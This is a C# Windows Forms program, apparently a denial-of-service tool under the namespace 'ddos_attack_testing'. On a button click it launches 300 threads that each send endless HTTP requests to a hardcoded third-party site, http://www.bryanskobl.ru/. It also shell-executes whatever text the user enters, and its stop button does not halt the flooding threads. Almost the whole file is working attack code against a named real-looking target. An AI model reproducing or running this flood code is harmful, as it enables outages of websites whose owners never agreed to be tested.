using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.Net.Http;
using System.Net;
using System.IO;

namespace ddos_attack_testing
{
    public partial class Form1 : Form
    {
        private Thread thread;
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            thread = new Thread(new ThreadStart(WorkThreadFunction));
            thread.Start();
            showProcessProgressbar(true);
            button1.Enabled = false;

            string httpRequest = textBox1.Text.ToLower().ToString();

            Process myProcess = new Process();
            try
            {
                myProcess.StartInfo.UseShellExecute = true;
                myProcess.StartInfo.FileName = httpRequest;
                myProcess.Start();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }

            startDDos();
        }


        public void startDDos()
        {
            for(long i = 0; i < 300; i++)
            {
                Thread thread = new Thread(new ThreadStart(WorkDDos));
                thread.Start();
            }
        }


        public void WorkDDos()
        {
            while (true)
            {
                try
                {
                var request = (HttpWebRequest)WebRequest.Create("http://www.bryanskobl.ru/");
                var response = (HttpWebResponse)request.GetResponse();
                var responseString = new StreamReader(response.GetResponseStream()).ReadToEnd();
             //   Debug.WriteLine(request.ToString());
             //   Debug.WriteLine(response.ToString());
             //   Debug.WriteLine(responseString.ToString());
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }
        }




        private void Form1_Load(object sender, EventArgs e){}

        private void showProcessProgressbar(Boolean true_false)
        {
            var thread = new Thread(() => {
                Thread.CurrentThread.IsBackground = true;
               
            });
            thread.Start();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            button1.Enabled = true;
            showProcessProgressbar(false);
            progressBar1.Value = 0;
            thread.Interrupt();
        }

        public void WorkThreadFunction()
        {
            try
            {
                int i = 0;
                while (true)
                {
                    this.Invoke(new Action(() =>
                    {
                       progressBar1.Value = i;                        
                    }));
                    Thread.Sleep(2000); i++; if (i > 100) i = 0;
                }
            }
            catch (Exception ex)
            {
                // log errors
            }
        }
    }
}
